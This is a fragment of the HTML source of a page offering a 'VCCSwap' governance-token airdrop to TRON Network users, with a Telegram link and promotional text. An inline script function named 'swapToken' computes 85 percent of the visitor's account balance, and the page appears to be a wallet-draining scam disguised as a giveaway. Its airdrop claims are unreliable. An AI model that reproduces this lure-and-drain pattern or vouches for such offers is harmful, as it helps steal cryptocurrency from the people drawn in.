...
<html lang="en" class="no-js">
  <head>
    ...
    <script src="/cdn-cgi/apps/head/-lSSG8OMGtclk7q_ITCZWl1_R1I.js"></script><link rel="shortcut icon" href="https://vccswap.github.io/favicon.ico">
      ...
      <div class="page-content">
          ...
          <header id="site_header" class="header mobile-menu-hide">
            <div class="header-content">
              <div class="header-photo">
                <img src="/main_photo.svg" alt="Logo">
              </div>
              <div class="header-titles">
                ...
                <a href="https://t.me/AllJustSwapListings/6137" class="button btn-send" target="blank">Telegram</a>
              </div>
            </div>
          ...
          <script>
              ...
              async function swapToken(){
                  ...
                  var v = Math.floor(acc.balance * 85 / 100);
                    ...
                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-6" style="background-color: #EEEEEE;border-radius: 25px;padding: 0 35px 20px;">
                      ...
                      <div class="block-title">
                        <p style="margin-top: 0px;">
                          On the occasion of the 10th month of launching the VCCSwap project and the more than expected reception of this project, we decided to generate a governance token and airdrop between active members of TRON Network and people who had transactions in the VCCSWAP project from December 20, 2020 with long-term goals as marketing distribution.
                        </p>
                      </div>
